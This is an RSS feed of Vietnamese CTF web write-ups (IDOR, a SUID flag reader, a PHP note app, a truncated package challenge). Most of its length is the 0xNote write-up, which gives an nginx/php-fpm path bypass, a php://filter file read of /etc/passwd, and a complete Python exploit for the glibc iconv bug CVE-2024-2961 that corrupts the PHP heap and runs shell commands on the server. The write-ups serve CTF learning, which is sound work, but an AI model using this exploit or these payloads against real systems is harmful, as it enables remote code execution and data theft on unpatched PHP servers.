<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>WEBs on MSEC</title>
    <link>http://localhost:1313/web/</link>
    <description>Recent content in WEBs on MSEC</description>
    <generator>Hugo</generator>
    <language>en</language>
    <atom:link href="http://localhost:1313/web/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>LEAK FORCE</title>
      <link>http://localhost:1313/web/1761315315933-web/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/web/1761315315933-web/</guid>
      <description>&lt;h1 id=&#34;leak-force&#34;&gt;LEAK FORCE&lt;/h1&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://hackmd.io/_uploads/BJQDAszAgg.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;h4 id=&#34;test&#34;&gt;TEST&lt;/h4&gt;&#xA;&lt;p&gt;Challenge cung cấp một mã nguồn HTML &lt;a href=&#34;http://web1.cscv.vn:9981/&#34;&gt;http://web1.cscv.vn:9981/&lt;/a&gt;&#xA;&lt;img src=&#34;https://hackmd.io/_uploads/SJ8899f0gg.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Trước tiên em sẽ thử các chức năng của web&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Register các thứ các thứ rồi login với username: abc2, password: abc&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Sau khi login xong thì sẽ được chuyển tới trang &lt;a href=&#34;http://web1.cscv.vn:9981/profile.html&#34;&gt;http://web1.cscv.vn:9981/profile.html&lt;/a&gt;&#xA;&lt;img src=&#34;https://hackmd.io/_uploads/HJwSEsG0le.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Tại đây em thử các chức năng &lt;strong&gt;Save Changes&lt;/strong&gt; và &lt;strong&gt;Update Password&lt;/strong&gt; thì không có gì đặc biệt&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Với target là IDOR, thì thường admin user có thể là ID 1 (khá phổ biến)&lt;/p&gt;</description>
    </item>
    <item>
      <title>Magik</title>
      <link>http://localhost:1313/web/1761494653599-tung/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/web/1761494653599-tung/</guid>
      <description>&lt;h1 id=&#34;magik&#34;&gt;Magik&lt;/h1&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Author : Tiwza&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;overview&#34;&gt;Overview&lt;/h2&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://hackmd.io/_uploads/H1KCSzoRxg.png&#34; alt=&#34;{BBFD61B4-A254-4DB8-9F65-A1E5CC5EEB72}&#34;&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;cầu-trúc-của-bài-này&#34;&gt;Cầu trúc của bài này&lt;/h3&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-code=&#34; data-lang=&#34;code=&#34;&gt;magik/&#xA;└── app/&#xA;        ├── index.php&#xA;   ├── convert.sh&#xA;   ├── docker-compose.yml&#xA;   ├── Dockerfile&#xA;   ├── flags.txt&#xA;   └── readflag.c&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;lần-lượt-đọc-từng-file&#34;&gt;Lần lượt đọc từng file&lt;/h3&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;code&gt;Dockerfile&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;- Đọc `Dockerfile` để hiểu rõ hơn&#xA;```code=&#xA;COPY readflag.c /readflag.c&#xA;RUN gcc /readflag.c -o /readflag&#xA;RUN chmod u+s /readflag&#xA;RUN rm -f /readflag.c&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;=&amp;gt; Đặt &lt;code&gt;SUID&lt;/code&gt; lên &lt;code&gt;/readflag&lt;/code&gt; nên user ở &lt;code&gt; www-data&lt;/code&gt; không thể đọc&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-code&#34; data-lang=&#34;code&#34;&gt;COPY /flags.txt /flag.txt&#xA;RUN chmod 400 /flag.txt&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;=&amp;gt; Chỉ root mới đọc được flag&lt;/p&gt;</description>
    </item>
    <item>
      <title>OxL4ugh CTF</title>
      <link>http://localhost:1313/web/0xl4ugh/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/web/0xl4ugh/</guid>
      <description>&lt;h1 id=&#34;0xnote&#34;&gt;0xNote&lt;/h1&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://hackmd.io/_uploads/ryOk1sVIWx.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;overview&#34;&gt;Overview&lt;/h2&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Backend : &lt;strong&gt;fpm&lt;/strong&gt;&#xA;&lt;img src=&#34;https://hackmd.io/_uploads/SJSBJj4U-l.png&#34; alt=&#34;image&#34;&gt;&lt;/li&gt;&#xA;&lt;li&gt;Proxy : &lt;strong&gt;nginx&lt;/strong&gt;&#xA;&lt;img src=&#34;https://hackmd.io/_uploads/HkQCko4LZl.png&#34; alt=&#34;image&#34;&gt;&lt;/li&gt;&#xA;&lt;li&gt;Giao diện&#xA;&lt;img src=&#34;https://hackmd.io/_uploads/SkCqlsE8be.png&#34; alt=&#34;image&#34;&gt;&lt;/li&gt;&#xA;&lt;li&gt;Tuy nhiên bị chặn ở &lt;code&gt;/premium.php&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;solve&#34;&gt;Solve&lt;/h2&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Với cách viết proxy như sau ta có thể bypass bằng việc thêm &lt;code&gt;index.php&lt;/code&gt; ngay sau thư mục mà ta bị chặn (&lt;code&gt;premium.php&lt;/code&gt;)&#xA;&lt;img src=&#34;https://hackmd.io/_uploads/BkGVeoVI-x.png&#34; alt=&#34;image&#34;&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://angelica.gitbook.io/hacktricks/pentesting-web/proxy-waf-protections-bypass#php-fpm&#34;&gt;Cách bypass ở đây&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;Sau khi vào được &lt;code&gt;/premium.php&lt;/code&gt; bằng &lt;code&gt;/premium.php/index.php&lt;/code&gt; ta thấy được ứng dụng set color không fillter input người dùng&lt;/li&gt;&#xA;&lt;li&gt;Như đoạn code sau nếu có thể kiểm soát được &lt;code&gt;color&lt;/code&gt; và &lt;code&gt;note&lt;/code&gt; thì có thể tạo ra 1 object mới :&#xA;&lt;img src=&#34;https://hackmd.io/_uploads/rkKAWiNL-e.png&#34; alt=&#34;image&#34;&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;exploit&#34;&gt;Exploit&lt;/h2&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;CHúng ta sẽ dùng SPLFileObject để đọc 1 file bất kì&lt;/li&gt;&#xA;&lt;li&gt;Set path : &lt;code&gt;php://filter/convert.base64-encode/resource=/etc/passwd&lt;/code&gt;&#xA;&lt;img src=&#34;https://hackmd.io/_uploads/Sy_7VjNUZx.png&#34; alt=&#34;image&#34;&gt;&lt;/li&gt;&#xA;&lt;li&gt;Set Classname&#xA;&lt;img src=&#34;https://hackmd.io/_uploads/H1PwVjEIWl.png&#34; alt=&#34;image&#34;&gt;&lt;/li&gt;&#xA;&lt;li&gt;Đọc kết quả&#xA;&lt;img src=&#34;https://hackmd.io/_uploads/rkbq4sV8Wx.png&#34; alt=&#34;image&#34;&gt;&lt;/li&gt;&#xA;&lt;li&gt;Auket lấy được &lt;code&gt;etc/passwd&lt;/code&gt; tuy nhiên flag có quyền Owner vậy nên chưa đủ quyền để đọc&#xA;&lt;img src=&#34;https://hackmd.io/_uploads/rJzRNiVUZg.png&#34; alt=&#34;image&#34;&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;nâng-quyền&#34;&gt;Nâng quyền&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Ngay khi thực hiện được &lt;code&gt;SPLFileObject&lt;/code&gt; như ở trên ta cũng có thể biến thể để nâng lên từ đọc file thành RCE từ &lt;a href=&#34;https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py&#34;&gt;đoạn tài liệu sau&lt;/a&gt; và &lt;a href=&#34;https://blog.lexfo.fr/iconv-cve-2024-2961-p1.html&#34;&gt;cái này&lt;/a&gt;&#xA;&lt;img src=&#34;https://hackmd.io/_uploads/SJfsHsVIZl.png&#34; alt=&#34;image&#34;&gt;&lt;/li&gt;&#xA;&lt;li&gt;Sau đây sẽ là PWN CORE , mình đéo biết giải thích như nào nên chạy code thôi ; Vào &lt;code&gt;http://localhost:5000/&lt;/code&gt; để check id&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php=&#34; data-lang=&#34;php=&#34;&gt;import requests&#xD;&#xA;from pwn import *&#xD;&#xA;import re&#xD;&#xA;import base64&#xD;&#xA;import zlib&#xD;&#xA;from bs4 import BeautifulSoup&#xD;&#xA;&#xD;&#xA;session = requests.Session()&#xD;&#xA;&#xD;&#xA;## Constant&#xD;&#xA;&#xD;&#xA;HEAP_SIZE = 2 * 1024 * 1024&#xD;&#xA;BUG = &amp;#34;劄&amp;#34;.encode(&amp;#34;utf-8&amp;#34;)&#xD;&#xA;&#xD;&#xA;## Post init function&#xD;&#xA;&#xD;&#xA;def get_file(url, path):&#xD;&#xA;    path = f&amp;#34;php://filter/convert.base64-encode/resource={path}&amp;#34;&#xD;&#xA;    r = session.post(url + &amp;#39;login.php&amp;#39;, data={&amp;#39;username&amp;#39;:&amp;#39;winky&amp;#39;})&#xD;&#xA;    r = session.post(url + &amp;#39;index.php&amp;#39;, data={&amp;#39;note&amp;#39;:path})&#xD;&#xA;    r = session.post(url + &amp;#39;/premium.php/index.php&amp;#39;, data={&amp;#39;color&amp;#39;: &amp;#39;SplFileObject&amp;#39;})&#xD;&#xA;    r = session.get(url + &amp;#39;index.php&amp;#39;)&#xD;&#xA;    soup = BeautifulSoup(r.text, &amp;#34;html.parser&amp;#34;)&#xD;&#xA;    data = soup.find(&amp;#34;div&amp;#34;, id=&amp;#34;noteContent&amp;#34;).get_text(strip=True)&#xD;&#xA;    return base64.b64decode(data)&#xD;&#xA;&#xD;&#xA;def compress(data):&#xD;&#xA;    return zlib.compress(data, 9)[2:-4]&#xD;&#xA;&#xD;&#xA;def compressed_bucket(data):&#xD;&#xA;    return chunked_chunk(data, 0x8000)&#xD;&#xA;&#xD;&#xA;def qpe(data):&#xD;&#xA;    return &amp;#34;&amp;#34;.join(f&amp;#34;={x:02x}&amp;#34; for x in data).upper().encode()&#xD;&#xA;&#xD;&#xA;def ptr_bucket(*ptrs, size=None):&#xD;&#xA;    if size is not None:&#xD;&#xA;        assert len(ptrs) * 8 == size&#xD;&#xA;    bucket = b&amp;#34;&amp;#34;.join(map(p64, ptrs))&#xD;&#xA;    bucket = qpe(bucket)&#xD;&#xA;    bucket = chunked_chunk(bucket)&#xD;&#xA;    bucket = chunked_chunk(bucket)&#xD;&#xA;    bucket = chunked_chunk(bucket)&#xD;&#xA;    bucket = compressed_bucket(bucket)&#xD;&#xA;    return bucket&#xD;&#xA;&#xD;&#xA;def chunked_chunk(data, size: int = None):&#xD;&#xA;    if size is None:&#xD;&#xA;        size = len(data) + 8&#xD;&#xA;    keep = len(data) + len(b&amp;#34;\n\n&amp;#34;)&#xD;&#xA;    size = f&amp;#34;{len(data):x}&amp;#34;.rjust(size - keep, &amp;#34;0&amp;#34;)&#xD;&#xA;    return size.encode() + b&amp;#34;\n&amp;#34; + data + b&amp;#34;\n&amp;#34;&#xD;&#xA;&#xD;&#xA;## Pwn core&#xD;&#xA;&#xD;&#xA;class PWN_Core():&#xD;&#xA;    def __init__(self, url, command) -&amp;gt; None:&#xD;&#xA;        self.url = url&#xD;&#xA;        self.command = command&#xD;&#xA;        self.info = {}&#xD;&#xA;        self.heap = None&#xD;&#xA;        self.pad = 20&#xD;&#xA;        &#xD;&#xA;    class Region():&#xD;&#xA;        def __init__(self, start, stop, permissions, path):&#xD;&#xA;            self.start = int(start)&#xD;&#xA;            self.stop = int(stop)&#xD;&#xA;            self.permissions = permissions&#xD;&#xA;            self.path = path&#xD;&#xA;        &#xD;&#xA;        @property&#xD;&#xA;        def size(self) -&amp;gt; int:&#xD;&#xA;            return self.stop - self.start&#xD;&#xA;    &#xD;&#xA;    def download_file(self, remote_path: str, local_path: str) -&amp;gt; None:&#xD;&#xA;        data = get_file(self.url, remote_path)&#xD;&#xA;        Path(local_path).write_bytes(data)&#xD;&#xA;    &#xD;&#xA;    def get_regions(self):&#xD;&#xA;        maps = get_file(self.url, &amp;#34;/proc/self/maps&amp;#34;)&#xD;&#xA;        maps = maps.decode()&#xD;&#xA;        PATTERN = re.compile(&#xD;&#xA;            r&amp;#34;^([a-f0-9]+)-([a-f0-9]+)\b&amp;#34; r&amp;#34;.*&amp;#34; r&amp;#34;\s([-rwx]{3}[ps])\s&amp;#34; r&amp;#34;(.*)&amp;#34;&#xD;&#xA;        )&#xD;&#xA;        regions = []&#xD;&#xA;        for region in [line.strip() for line in maps.strip().split(&amp;#39;\n&amp;#39;)]:&#xD;&#xA;            if match := PATTERN.match(region):&#xD;&#xA;                start = int(match.group(1), 16)&#xD;&#xA;                stop = int(match.group(2), 16)&#xD;&#xA;                permissions = match.group(3)&#xD;&#xA;                path = match.group(4)&#xD;&#xA;                if &amp;#34;/&amp;#34; in path or &amp;#34;[&amp;#34; in path:&#xD;&#xA;                    path = path.rsplit(&amp;#34; &amp;#34;, 1)[-1]&#xD;&#xA;                else:&#xD;&#xA;                    path = &amp;#34;&amp;#34;&#xD;&#xA;                current = self.Region(start, stop, permissions, path)&#xD;&#xA;                regions.append(current)&#xD;&#xA;                &#xD;&#xA;            else:&#xD;&#xA;                print(maps)&#xD;&#xA;        return regions&#xD;&#xA;&#xD;&#xA;    def _get_region(self, regions: list[Region], *names: str) -&amp;gt; Region:&#xD;&#xA;        for region in regions:&#xD;&#xA;            if any(name in region.path for name in names):&#xD;&#xA;                break&#xD;&#xA;        return region&#xD;&#xA;&#xD;&#xA;    def find_main_heap(self, regions):&#xD;&#xA;        heaps = [&#xD;&#xA;            region.stop - HEAP_SIZE + 0x40&#xD;&#xA;            for region in reversed(regions)&#xD;&#xA;            if region.permissions == &amp;#34;rw-p&amp;#34;&#xD;&#xA;            and region.size &amp;gt;= HEAP_SIZE&#xD;&#xA;            and region.stop &amp;amp; (HEAP_SIZE-1) == 0&#xD;&#xA;            and region.path in (&amp;#34;&amp;#34;, &amp;#34;[anon:zend_alloc]&amp;#34;)&#xD;&#xA;        ]&#xD;&#xA;        first = heaps[0]&#xD;&#xA;        if len(heaps) &amp;gt; 1:&#xD;&#xA;            heaps = &amp;#34;, &amp;#34;.join(map(hex, heaps))&#xD;&#xA;        return first&#xD;&#xA;&#xD;&#xA;    def get_symbols_and_addresses(self) -&amp;gt; None:&#xD;&#xA;        regions = self.get_regions()&#xD;&#xA;        LIBC_FILE = &amp;#34;./libc&amp;#34;&#xD;&#xA;        self.info[&amp;#34;heap&amp;#34;] = self.find_main_heap(regions)&#xD;&#xA;        libc = self._get_region(regions, &amp;#34;libc-&amp;#34;, &amp;#34;libc.so&amp;#34;)&#xD;&#xA;        self.download_file(libc.path, LIBC_FILE)&#xD;&#xA;        self.info[&amp;#34;libc&amp;#34;] = ELF(LIBC_FILE, checksec=False)&#xD;&#xA;        self.info[&amp;#34;libc&amp;#34;].address = libc.start&#xD;&#xA;&#xD;&#xA;    def build_exploit_path(self):&#xD;&#xA;        &#xD;&#xA;        self.get_symbols_and_addresses()&#xD;&#xA;        &#xD;&#xA;        LIBC = self.info[&amp;#34;libc&amp;#34;]&#xD;&#xA;        ADDR_EMALLOC = LIBC.symbols[&amp;#34;__libc_malloc&amp;#34;]&#xD;&#xA;        ADDR_EFREE = LIBC.symbols[&amp;#34;__libc_system&amp;#34;]&#xD;&#xA;        ADDR_EREALLOC = LIBC.symbols[&amp;#34;__libc_realloc&amp;#34;]&#xD;&#xA;        ADDR_HEAP = self.info[&amp;#34;heap&amp;#34;]&#xD;&#xA;        ADDR_FREE_SLOT = ADDR_HEAP + 0x20&#xD;&#xA;        ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168&#xD;&#xA;        ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10&#xD;&#xA;        CS = 0x100&#xD;&#xA;&#xD;&#xA;        pad_size = CS - 0x18&#xD;&#xA;        pad = b&amp;#34;\x00&amp;#34; * pad_size&#xD;&#xA;        pad = chunked_chunk(pad, len(pad) + 6)&#xD;&#xA;        pad = chunked_chunk(pad, len(pad) + 6)&#xD;&#xA;        pad = chunked_chunk(pad, len(pad) + 6)&#xD;&#xA;        pad = compressed_bucket(pad)&#xD;&#xA;&#xD;&#xA;        step1_size = 1&#xD;&#xA;        step1 = b&amp;#34;\x00&amp;#34; * step1_size&#xD;&#xA;        step1 = chunked_chunk(step1)&#xD;&#xA;        step1 = chunked_chunk(step1)&#xD;&#xA;        step1 = chunked_chunk(step1, CS)&#xD;&#xA;        step1 = compressed_bucket(step1)&#xD;&#xA;        &#xD;&#xA;        step2_size = 0x48&#xD;&#xA;        step2 = b&amp;#34;\x00&amp;#34; * (step2_size + 8)&#xD;&#xA;        step2 = chunked_chunk(step2, CS)&#xD;&#xA;        step2 = chunked_chunk(step2)&#xD;&#xA;        step2 = compressed_bucket(step2)&#xD;&#xA;&#xD;&#xA;        step2_write_ptr = b&amp;#34;0\n&amp;#34;.ljust(step2_size, b&amp;#34;\x00&amp;#34;) + p64(ADDR_FAKE_BIN)&#xD;&#xA;        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)&#xD;&#xA;        step2_write_ptr = chunked_chunk(step2_write_ptr)&#xD;&#xA;        step2_write_ptr = compressed_bucket(step2_write_ptr)&#xD;&#xA;&#xD;&#xA;        step3_size = CS&#xD;&#xA;        step3 = b&amp;#34;\x00&amp;#34; * step3_size&#xD;&#xA;        assert len(step3) == CS&#xD;&#xA;        step3 = chunked_chunk(step3)&#xD;&#xA;        step3 = chunked_chunk(step3)&#xD;&#xA;        step3 = chunked_chunk(step3)&#xD;&#xA;        step3 = compressed_bucket(step3)&#xD;&#xA;&#xD;&#xA;        step3_overflow = b&amp;#34;\x00&amp;#34; * (step3_size - len(BUG)) + BUG&#xD;&#xA;        assert len(step3_overflow) == CS&#xD;&#xA;        step3_overflow = chunked_chunk(step3_overflow)&#xD;&#xA;        step3_overflow = chunked_chunk(step3_overflow)&#xD;&#xA;        step3_overflow = chunked_chunk(step3_overflow)&#xD;&#xA;        step3_overflow = compressed_bucket(step3_overflow)&#xD;&#xA;&#xD;&#xA;        step4_size = CS&#xD;&#xA;        step4 = b&amp;#34;=00&amp;#34; + b&amp;#34;\x00&amp;#34; * (step4_size - 1)&#xD;&#xA;        step4 = chunked_chunk(step4)&#xD;&#xA;        step4 = chunked_chunk(step4)&#xD;&#xA;        step4 = chunked_chunk(step4)&#xD;&#xA;        step4 = compressed_bucket(step4)&#xD;&#xA;        &#xD;&#xA;        step4_pwn = ptr_bucket(&#xD;&#xA;            0x200000,&#xD;&#xA;            0,&#xD;&#xA;            # free_slot&#xD;&#xA;            0,&#xD;&#xA;            0,&#xD;&#xA;            ADDR_CUSTOM_HEAP,  # 0x18&#xD;&#xA;            0,&#xD;&#xA;            0,&#xD;&#xA;            0,&#xD;&#xA;            0,&#xD;&#xA;            0,&#xD;&#xA;            0,&#xD;&#xA;            0,&#xD;&#xA;            0,&#xD;&#xA;            0,&#xD;&#xA;            0,&#xD;&#xA;            0,&#xD;&#xA;            0,&#xD;&#xA;            0,&#xD;&#xA;            ADDR_HEAP,  # 0x140&#xD;&#xA;            0,&#xD;&#xA;            0,&#xD;&#xA;            0,&#xD;&#xA;            0,&#xD;&#xA;            0,&#xD;&#xA;            0,&#xD;&#xA;            0,&#xD;&#xA;            0,&#xD;&#xA;            0,&#xD;&#xA;            0,&#xD;&#xA;            0,&#xD;&#xA;            0,&#xD;&#xA;            0,&#xD;&#xA;            size=CS,&#xD;&#xA;        )&#xD;&#xA;&#xD;&#xA;        step4_custom_heap = ptr_bucket(&#xD;&#xA;            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18&#xD;&#xA;        )&#xD;&#xA;        &#xD;&#xA;        step4_use_custom_heap_size = 0x140&#xD;&#xA;        &#xD;&#xA;        COMMAND = self.command&#xD;&#xA;        COMMAND = f&amp;#34;kill -9 $PPID; {COMMAND}&amp;#34;&#xD;&#xA;        COMMAND = COMMAND.encode() + b&amp;#34;\x00&amp;#34;&#xD;&#xA;&#xD;&#xA;        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b&amp;#34;\x00&amp;#34;)&#xD;&#xA;&#xD;&#xA;        step4_use_custom_heap = COMMAND&#xD;&#xA;        step4_use_custom_heap = qpe(step4_use_custom_heap)&#xD;&#xA;        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)&#xD;&#xA;        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)&#xD;&#xA;        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)&#xD;&#xA;        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)&#xD;&#xA;        &#xD;&#xA;        pages = (&#xD;&#xA;            step4 * 3&#xD;&#xA;            + step4_pwn&#xD;&#xA;            + step4_custom_heap&#xD;&#xA;            + step4_use_custom_heap&#xD;&#xA;            + step3_overflow&#xD;&#xA;            + pad * self.pad&#xD;&#xA;            + step1 * 3&#xD;&#xA;            + step2_write_ptr&#xD;&#xA;            + step2 * 2&#xD;&#xA;        )&#xD;&#xA;        &#xD;&#xA;        resource = compress(compress(pages))&#xD;&#xA;        resource = base64.b64encode(resource).decode()&#xD;&#xA;        resource = f&amp;#34;data:text/plain;base64,{resource}&amp;#34;&#xD;&#xA;        &#xD;&#xA;        filters = [&#xD;&#xA;            # Create buckets&#xD;&#xA;            &amp;#34;zlib.inflate&amp;#34;,&#xD;&#xA;            &amp;#34;zlib.inflate&amp;#34;,&#xD;&#xA;            &#xD;&#xA;            # Step 0: Setup heap&#xD;&#xA;            &amp;#34;dechunk&amp;#34;,&#xD;&#xA;            &amp;#34;convert.iconv.L1.L1&amp;#34;,&#xD;&#xA;            &#xD;&#xA;            # Step 1: Reverse FL order&#xD;&#xA;            &amp;#34;dechunk&amp;#34;,&#xD;&#xA;            &amp;#34;convert.iconv.L1.L1&amp;#34;,&#xD;&#xA;            &#xD;&#xA;            # Step 2: Put fake pointer and make FL order back to normal&#xD;&#xA;            &amp;#34;dechunk&amp;#34;,&#xD;&#xA;            &amp;#34;convert.iconv.L1.L1&amp;#34;,&#xD;&#xA;            &#xD;&#xA;            # Step 3: Trigger overflow&#xD;&#xA;            &amp;#34;dechunk&amp;#34;,&#xD;&#xA;            &amp;#34;convert.iconv.UTF-8.ISO-2022-CN-EXT&amp;#34;,&#xD;&#xA;            &#xD;&#xA;            # Step 4: Allocate at arbitrary address and change zend_mm_heap&#xD;&#xA;            &amp;#34;convert.quoted-printable-decode&amp;#34;,&#xD;&#xA;            &amp;#34;convert.iconv.L1.L1&amp;#34;,&#xD;&#xA;        ]&#xD;&#xA;        filters = &amp;#34;|&amp;#34;.join(filters)&#xD;&#xA;        path = f&amp;#34;php://filter/read={filters}/resource={resource}&amp;#34;&#xD;&#xA;        return path&#xD;&#xA;&#xD;&#xA;def solve():&#xD;&#xA;    URL = &amp;#39;http://localhost:5000/&amp;#39;&#xD;&#xA;    &#xD;&#xA;    command = &amp;#39;id &amp;gt; /tmp/check_id&amp;#39;&#xD;&#xA;    &#xD;&#xA;    print(f&amp;#39;[+] Build payload với lệnh: {command}&amp;#39;)&#xD;&#xA;    path = PWN_Core(URL, command).build_exploit_path()&#xD;&#xA;    &#xD;&#xA;    # 2. Gửi Exploit (Chấp nhận lỗi 502/Server Crash)&#xD;&#xA;    try:&#xD;&#xA;        print(&amp;#39;[*] Đang gửi payload kích hoạt RCE...&amp;#39;)&#xD;&#xA;        # Bước này server có thể trả về 502 do tiến trình crash, ta dùng try/except để bỏ qua lỗi&#xD;&#xA;        # Lưu ý: Không gọi get_file ở đây để đọc kết quả ngay, vì hàm get_file sẽ fail khi parse HTML lỗi&#xD;&#xA;        &#xD;&#xA;        # Tự gửi request thủ công để tránh logic parse HTML của hàm get_file&#xD;&#xA;        exploit_payload = f&amp;#34;php://filter/convert.base64-encode/resource={path}&amp;#34;&#xD;&#xA;        session.post(URL + &amp;#39;login.php&amp;#39;, data={&amp;#39;username&amp;#39;:&amp;#39;winky&amp;#39;})&#xD;&#xA;        session.post(URL + &amp;#39;index.php&amp;#39;, data={&amp;#39;note&amp;#39;: exploit_payload})&#xD;&#xA;        session.post(URL + &amp;#39;/premium.php/index.php&amp;#39;, data={&amp;#39;color&amp;#39;: &amp;#39;SplFileObject&amp;#39;})&#xD;&#xA;        session.get(URL + &amp;#39;index.php&amp;#39;, timeout=5) # Kích hoạt exploit&#xD;&#xA;        &#xD;&#xA;    except Exception as e:&#xD;&#xA;        # Lỗi 502 hoặc timeout là dấu hiệu tốt (server đang xử lý/crash do exploit)&#xD;&#xA;        print(f&amp;#39;[!] Server phản hồi/crash (điều này là bình thường với CVE-2024-2961): {e}&amp;#39;)&#xD;&#xA;    &#xD;&#xA;    # 3. Đợi hệ thống đồng bộ file&#xD;&#xA;    import time&#xD;&#xA;    print(&amp;#39;[*] Đợi 2 giây để lệnh thực thi xong...&amp;#39;)&#xD;&#xA;    time.sleep(2)&#xD;&#xA;    &#xD;&#xA;    # 4. Đọc kết quả từ file /tmp/check_id bằng LFI (Sử dụng lại hàm get_file)&#xD;&#xA;    print(&amp;#39;[*] Đang đọc kết quả từ /tmp/check_id...&amp;#39;)&#xD;&#xA;    try:&#xD;&#xA;        # Dùng chính tính năng SplFileObject để đọc file kết quả&#xD;&#xA;        result = get_file(URL, &amp;#34;/tmp/check_id&amp;#34;)&#xD;&#xA;        &#xD;&#xA;        if result:&#xD;&#xA;            print(&amp;#39;\n[+] KẾT QUẢ COMMAND ID:&amp;#39;)&#xD;&#xA;            print(&amp;#39;=&amp;#39;*40)&#xD;&#xA;            print(result.decode(&amp;#39;utf-8&amp;#39;).strip())&#xD;&#xA;            print(&amp;#39;=&amp;#39;*40)&#xD;&#xA;        else:&#xD;&#xA;            print(&amp;#39;[-] Không đọc được kết quả. Có thể exploit chưa thành công.&amp;#39;)&#xD;&#xA;            &#xD;&#xA;    except Exception as e:&#xD;&#xA;        print(f&amp;#39;[-] Lỗi khi đọc file kết quả: {e}&amp;#39;)&#xD;&#xA;&#xD;&#xA;if __name__ == &amp;#34;__main__&amp;#34;:&#xD;&#xA;    solve()&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://hackmd.io/_uploads/SyU18T4I-g.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>PACKAGES</title>
      <link>http://localhost:1313/web/1762867950463-web/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/web/1762867950463-web/</guid>
      <description>&lt;h1 id=&#34;packages&#34;&gt;PACKAGES&lt;/h1&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://hackmd.io/_uploads/Sy32vseeWx.png&#34; alt=&#34;image&#34;&gt;&#xA;&lt;a href=&#34;https://packages.challs.pwnoh.io/&#34;&gt;https://packages.challs.pwnoh.io/&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;phân-tích-source&#34;&gt;Phân tích source&lt;/h3&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://hackmd.io/_uploads/SyyEhilxZx.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;main.py&lt;/code&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;distro  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; request.&lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;distro&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;).&lt;span 